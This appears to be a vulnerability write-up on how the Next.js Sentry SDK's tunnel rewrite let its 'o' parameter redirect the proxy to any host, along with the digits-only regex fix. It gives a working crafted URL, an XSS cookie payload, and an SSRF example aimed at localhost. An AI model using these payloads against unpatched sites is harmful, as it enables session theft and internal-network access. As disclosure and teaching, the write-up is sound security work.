@@ -1,0 +1,137 @@
+The implementation of the Next.js Sentry SDK is in [sentry-javascript/packages/nextjs/src/config/withSentryConfig.ts](https://github.com/getsentry/sentry-javascript/blob/7.69.0/packages/nextjs/src/config/withSentryConfig.ts#L98):
+
+``` js
+/**
+ * Injects rewrite rules into the Next.js config provided by the user to tunnel
+ * requests from the `tunnelPath` to Sentry.
+ *
+ * See https://nextjs.org/docs/api-reference/next.config.js/rewrites.
+ */
+function setUpTunnelRewriteRules(userNextConfig: NextConfigObject, tunnelPath: string): void {
+  const originalRewrites = userNextConfig.rewrites;
+
+  // This function doesn't take any arguments at the time of writing but we future-proof
+  // here in case Next.js ever decides to pass some
+  userNextConfig.rewrites = async (...args: unknown[]) => {
+    const injectedRewrite = {
+      // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&p=[projectid]`
+      // Nextjs will automatically convert `source` into a regex for us
+      source: `${tunnelPath}(/?)`,
+      has: [
+        {
+          type: 'query',
+          key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers
+          value: '(?<orgid>.*)',
+        },
+        {
+          type: 'query',
+          key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers
+          value: '(?<projectid>.*)',
+        },
+      ],
+      destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0',
+    };
+
+    if (typeof originalRewrites !== 'function') {
+      return [injectedRewrite];
+    }
+
+    // @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it
+    const originalRewritesResult = await originalRewrites(...args);
+
+    if (Array.isArray(originalRewritesResult)) {
+      return [injectedRewrite, ...originalRewritesResult];
+    } else {
+      return {
+        ...originalRewritesResult,
+        beforeFiles: [injectedRewrite, ...(originalRewritesResult.beforeFiles || [])],
+      };
+    }
+  };
+}
+```
+
+The crucial part is this section:
+
+``` js
+const injectedRewrite = {
+  // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&p=[projectid]`
+  // Nextjs will automatically convert `source` into a regex for us
+  source: `${tunnelPath}(/?)`,
+  has: [
+    {
+      type: 'query',
+      key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers
+      value: '(?<orgid>.*)',
+    },
+    {
+      type: 'query',
+      key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers
+      value: '(?<projectid>.*)',
+    },
+  ],
+  destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0',
+};
+```
+
+It determines the final URL to redirect to based on the `o` and `p` query string parameters.
+
+The problem here is that both of these parameters use the `.*` regular expression, which matches any character. In other words, for the following URL:
+
+```
+https://huli.tw/tunnel?o=abc&p=def
+```
+
+It will proxy to:
+
+```
+https://oabc.ingest.sentry.io/api/def/envelope/?hsts=0
+```
+
+It looks fine, but what if it's like this?
+
+```
+https://huli.tw/tunnel?o=example.com%23&p=def
+```
+
+`%23` is the URL-encoded result of `#`. It will be proxied to:
+
+```
+https://oexample.com#.ingest.sentry.io/api/def/envelope/?hsts=0
+```
+
+We use `#` to include the original hostname as part of the hash and successfully change the destination of the proxy. However, the leading `o` is a bit annoying. Let's get rid of it by adding `@` at the beginning:
+
+```
+https://huli.tw/tunnel?o=@example.com%23&p=def
+```
+
+It becomes:
+
+```
+https://o@example.com#.ingest.sentry.io/api/def/envelope/?hsts=0
+```
+
+In this way, an attacker can use the `o` parameter to change the destination of the proxy and redirect the request anywhere. As mentioned earlier, this rewrite feature directly returns the response. So when a user visits `https://huli.tw/tunnel?o=@example.com%23&p=def`, they will see the response of `example.com`.
+
+In other words, if an attacker redirects the request to their own website, they can output `<script>alert(document.cookie)</script>`, turning it into an XSS vulnerability.
+
+If the attacker redirects the request to other internal web pages like `https://localhost:3001`, it becomes an SSRF vulnerability (but the target must support HTTPS).
+
+As for the fix, it's simple. Just add some restrictions to the regex. Finally, Sentry adjusted it to [only allow digits](https://github.com/getsentry/sentry-javascript/pull/9416/files):
+
+``` js
+{
+  type: 'query',
+  key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers
+  value: '(?<orgid>\\d*)',
+},
+```
+
+This issue has been fixed in version 7.77.0 and later.
+
+## Conclusion
+
+This vulnerability is really simple and easy to reproduce. Just find the fix commit and take a look at the code to understand how to exploit it.
+
+In summary, when doing URL rewriting, you really need to be cautious, as it's easy to encounter issues (especially when you're not just rewriting the path but the entire URL).
